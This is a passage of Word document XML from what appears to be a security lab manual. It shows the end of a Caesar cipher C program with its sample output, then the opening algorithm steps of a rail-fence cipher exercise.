    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="313" w:lineRule="auto"/>
        <w:ind w:left="240" w:right="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>static int p=0,q=0; printf("\nCiphertext : ");getchar();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="168" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="240"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>while((d=getchar()) != '\n')</w:t>
      </w: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964394">
      <w:pPr>
        <w:spacing w:line="261" w:lineRule="auto"/>
        <w:ind w:left="720" w:right="880"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>ciphertext[p++]=(char)d; plaintext[q++]=(char)(d-3);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="2" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="240"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="240"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>return 0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="270" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Output:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="252" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">[root@localhost security lab]# </w:t>
      </w:r>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>gcc caesar.c</w:t>
      </w:r>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> [root@localhost security lab]# </w:t>
      </w:r>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>./a.out</w:t>
      </w:r>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> Press 1 to Encrypt Plaintext</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="1" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:right="1400"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>Press 2 to Decrypt Ciphertext Press 9 to Exit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>Your option=1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="276" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>Plaintext : INDIA</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>Ciphertext : LQGLD</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>Press 1 to Encrypt Plaintext</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>Press 2 to Decrypt Ciphertext</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>Press 9 to Exit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>Your option=2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="276" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="287" w:lineRule="auto"/>
        <w:ind w:right="1320"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>Ciphertext : LQGLD Plaintext : INDIA [root@localhost security lab]#</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="342" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Result:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
        <w:sectPr w:rsidR="00964394" w:rsidRPr="00964394" w:rsidSect="00B82EFE">
          <w:footerReference w:type="default" r:id="rId7"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1398" w:right="985" w:bottom="909" w:left="1240" w:header="0" w:footer="0" w:gutter="0"/>
          <w:cols w:space="0" w:equalWidth="0">
            <w:col w:w="9675"/>
          </w:cols>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="4092" w:right="715" w:hanging="3992"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 2                                                                                                             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ate: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AIL-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CE</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footerReference w:type="default" r:id="rId8"/>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R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>-Fence</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">pher </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>chn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>que</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>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t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>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2.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>ake</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>eng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>3.  R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:t>ove</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>espaces from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="400" w:right="5523" w:hanging="300"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>4.  For each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char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>do - a. If ch % 2 == 0 put</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>n a[]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">array b. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>El</w:t>
      </w:r>
      <w:r>
        <w:t>se put</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n b[] array</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>5.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>ake</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>each</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>chara</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">er </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a[] array and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>put</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>n s[] array and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ncre</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ndex.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
